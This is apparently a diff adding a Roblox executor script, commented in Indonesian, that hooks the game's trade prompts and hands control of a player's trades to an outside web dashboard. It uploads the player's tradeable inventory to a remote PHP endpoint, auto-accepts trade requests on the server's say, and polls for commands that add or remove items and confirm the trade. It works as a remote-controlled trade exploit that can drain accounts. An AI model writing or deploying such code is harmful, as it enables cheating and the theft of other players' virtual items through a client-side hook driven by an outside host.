@@ -1,0 +1,272 @@
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local WEB_URL = "http://ez.mn/tmpl/feeds/feed/rob/api_trade.php" 
+local username = Players.LocalPlayer.Name
+
+local function showGameAlert(message)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Connected",
+            Text = message,
+            Duration = 3
+        })
+    end)
+end
+
+-- Load Modules
+local successPrompt, PromptController = pcall(function() return require(ReplicatedStorage:WaitForChild("Controllers"):WaitForChild("PromptController")) end)
+local successPromise, Promise = pcall(function() return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Promise")) end)
+local successTradeData, TradeData = pcall(function() return require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Trading"):WaitForChild("TradeData")) end)
+local successReplion, Replion = pcall(function() return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Replion")) end)
+local successItemUtil, ItemUtility = pcall(function() return require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("ItemUtility")) end)
+local successInternal, InternalUtility = pcall(function() return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ToolTip"):WaitForChild("Internal"):WaitForChild("Utility")) end)
+
+if not successTradeData or not TradeData.Remotes then
+    showGameAlert("Gagal memuat sistem Trade!")
+    return
+end
+local Remotes = TradeData.Remotes
+
+-- ==========================================
+-- FUNGSI WEB SYNC
+-- ==========================================
+local function clearWebInventory()
+    pcall(function()
+        request({
+            Url = WEB_URL .. "?action=sync_inventory",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ username = username, items = {} })
+        })
+    end)
+end
+
+-- LANGSUNG BERSIHKAN WEB SAAT SCRIPT PERTAMA KALI DI-EXECUTE
+task.spawn(clearWebInventory)
+showGameAlert("Sistem Trade Zero-Polling aktif & Web di-reset!")
+
+local function sendTradeInventoryData()
+    if not successReplion or not Replion then return end
+    local playerData = Replion.Client:WaitReplion("Data")
+    if not playerData then return end
+    
+    local inventory = playerData:Get("Inventory")
+    if not inventory then return end
+
+    local inventoryPayload = {}
+    for categoryName, categoryItems in pairs(inventory) do
+        if type(categoryItems) == "table" then
+            for _, itemData in ipairs(categoryItems) do
+                if itemData and itemData.Id and itemData.UUID and not itemData.TradeLocked then
+                    local successItem, itemInfo = pcall(function() return ItemUtility.GetItemDataFromItemType(categoryName, itemData.Id) end)
+                    if successItem and itemInfo and itemInfo.Data then
+                        local canTrade = true
+                        if TradeData.FollowTradeRules and type(TradeData.FollowTradeRules) == "function" then
+                            canTrade = TradeData.FollowTradeRules(itemInfo, { Metadata = itemData.Metadata })
+                        end
+
+                        if canTrade then
+                            local realData = itemInfo.Data
+                            local metadata = itemData.Metadata or {}
+                            local rawIcon = realData.Icon or realData.Image or itemInfo.Icon or itemInfo.Image or ""
+                            local rawMutation = metadata.VariantId
+                            local isShiny = metadata.Shiny == true
+                            
+                            local finalMutation = ""
+                            if rawMutation and isShiny then finalMutation = tostring(rawMutation) .. " Shiny"
+                            elseif rawMutation then finalMutation = tostring(rawMutation)
+                            elseif isShiny then finalMutation = "Shiny" end
+
+                            local rarityName = "Common"
+                            if successInternal and InternalUtility and InternalUtility.getTierData then
+                                local succTier, tierData = pcall(function() return InternalUtility.getTierData(itemInfo) end)
+                                if succTier and tierData and tierData.Name then rarityName = tostring(tierData.Name) end
+                            end
+
+                            table.insert(inventoryPayload, {
+                                UUID = tostring(itemData.UUID),
+                                Name = tostring(realData.Name or "Unknown"),
+                                Type = tostring(realData.Type or categoryName),
+                                Icon = tostring(rawIcon),
+                                Weight = tonumber(metadata.Weight) or 0,
+                                Mutation = finalMutation,
+                                Quantity = tonumber(itemData.Quantity) or 1,
+                                Rarity = rarityName
+                            })
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    pcall(function()
+        request({
+            Url = WEB_URL .. "?action=sync_inventory",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ username = username, items = inventoryPayload })
+        })
+    end)
+end
+
+-- ==========================================
+-- SISTEM STATE & KONTROL POLLING
+-- ==========================================
+local isTradingActive = false
+
+task.spawn(function()
+    
+    -- 1. CEGAT UI POP-UP TRADE REQUEST
+    if successPrompt and PromptController and successPromise and Promise then
+        local oldFirePrompt = PromptController.FirePrompt
+        
+        PromptController.FirePrompt = function(self, text, ...)
+            if type(text) == "string" and string.find(text, "Trade request") then
+                return Promise.new(function(resolve, reject)
+                    showGameAlert("Ada request Trade! Menunggu Auto Accept (30s)...")
+                    
+                    task.spawn(function()
+                        local timeLimit = 30
+                        local accepted = false
+                        
+                        while timeLimit > 0 do
+                            pcall(function()
+                                local response = request({
+                                    Url = WEB_URL .. "?action=poll_commands&username=" .. HttpService:UrlEncode(username),
+                                    Method = "GET"
+                                })
+                                if response.StatusCode == 200 then
+                                    local resData = HttpService:JSONDecode(response.Body)
+                                    if resData.status == 'ok' and resData.auto_accept == 1 then
+                                        accepted = true
+                                    end
+                                end
+                            end)
+                            
+                            if accepted then break end
+                            task.wait(1)
+                            timeLimit = timeLimit - 1
+                        end
+                        
+                        if accepted then
+                            showGameAlert("Auto Accept ON! Menerima trade...")
+                            resolve(true)
+                        else
+                            showGameAlert("Timeout / Auto Accept OFF. Mengabaikan trade.")
+                            resolve(false)
+                        end
+                    end)
+                end)
+            end
+            return oldFirePrompt(self, text, ...)
+        end
+    end
+
+    -- 2. SAAT JENDELA TRADE UTAMA TERBUKA
+    if Remotes.TradeStarted then
+        Remotes.TradeStarted.OnClientEvent:Connect(function(sessionId)
+            sendTradeInventoryData()
+            
+            if not isTradingActive then
+                isTradingActive = true
+                showGameAlert("Trade aktif! Menghubungkan ke dashboard.")
+                
+                task.spawn(function()
+                    while isTradingActive do
+                        pcall(function()
+                            local response = request({
+                                Url = WEB_URL .. "?action=poll_commands&username=" .. HttpService:UrlEncode(username),
+                                Method = "GET"
+                            })
+
+                            if response.StatusCode == 200 then
+                                local resData = HttpService:JSONDecode(response.Body)
+                                if resData.status == 'ok' then
+                                    local cmd = resData.command
+                                    if cmd then
+                                        if cmd.action_type == 'add_item' and cmd.item_uuid ~= "" then
+                                            local playerData = Replion.Client:WaitReplion("Data")
+                                            local inventory = playerData and playerData:Get("Inventory")
+                                            local foundType = nil
+                                            if inventory then
+                                                for catName, catItems in pairs(inventory) do
+                                                    if type(catItems) == "table" then
+                                                        for _, itm in ipairs(catItems) do
+                                                            if itm.UUID == cmd.item_uuid then
+                                                                local successItem, itemInfo = pcall(function() return ItemUtility.GetItemDataFromItemType(catName, itm.Id) end)
+                                                                if successItem and itemInfo and itemInfo.Data then foundType = itemInfo.Data.Type end
+                                                                break
+                                                            end
+                                                        end
+                                                    end
+                                                    if foundType then break end
+                                                end
+                                            end
+                                            if foundType then pcall(function() Remotes.AddItem:InvokeServer(foundType, cmd.item_uuid) end) end
+                                            
+                                        elseif cmd.action_type == 'remove_item' and cmd.item_uuid ~= "" then
+                                            local playerData = Replion.Client:WaitReplion("Data")
+                                            local inventory = playerData and playerData:Get("Inventory")
+                                            local foundType = nil
+                                            if inventory then
+                                                for catName, catItems in pairs(inventory) do
+                                                    if type(catItems) == "table" then
+                                                        for _, itm in ipairs(catItems) do
+                                                            if itm.UUID == cmd.item_uuid then
+                                                                local successItem, itemInfo = pcall(function() return ItemUtility.GetItemDataFromItemType(catName, itm.Id) end)
+                                                                if successItem and itemInfo and itemInfo.Data then foundType = itemInfo.Data.Type end
+                                                                break
+                                                            end
+                                                        end
+                                                    end
+                                                    if foundType then break end
+                                                end
+                                            end
+                                            if foundType then pcall(function() Remotes.RemoveItem:InvokeServer(foundType, cmd.item_uuid) end) end                            
+
+                                        elseif cmd.action_type == 'ready' then
+                                            pcall(function() Remotes.SetReady:InvokeServer(true) end)
+                                        elseif cmd.action_type == 'confirm' then
+                                            pcall(function() Remotes.ConfirmTrade:InvokeServer() end)
+                                        elseif cmd.action_type == 'decline' then
+                                            pcall(function() Remotes.DeclineTradeOffer:InvokeServer() end)
+                                            isTradingActive = false
+                                            clearWebInventory()
+                                        end
+                                    end
+                                end
+                            end
+                        end)
+                        task.wait(1) 
+                    end
+                end)
+            end
+        end)
+    end
+
+    -- 3. SAAT TRADE SELESAI / BATAL
+    local function stopTradeSession()
+        if isTradingActive then
+            isTradingActive = false 
+            showGameAlert("Sesi trade berakhir. Membersihkan dashboard...")
+            task.spawn(clearWebInventory)
+        end
+    end
+
+    -- A. Mendengarkan Remote Asli Game[span_4](start_span)[span_4](end_span)
+    if Remotes.TradeCompleted then Remotes.TradeCompleted.OnClientEvent:Connect(stopTradeSession) end
+    if Remotes.TradeEnded then Remotes.TradeEnded.OnClientEvent:Connect(stopTradeSession) end
+
+    -- B. ULTIMATE FAILSAFE: Memantau GUI Trade Langsung[span_5](start_span)[span_5](end_span)
+    local tradingGui = Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("! Trading")
+    tradingGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+        -- Jika GUI disembunyikan game (trade batal, tutup, disconnect) otomatis bersihkan!
+        if not tradingGui.Enabled then
+            stopTradeSession()
+        end
+    end)
+end)
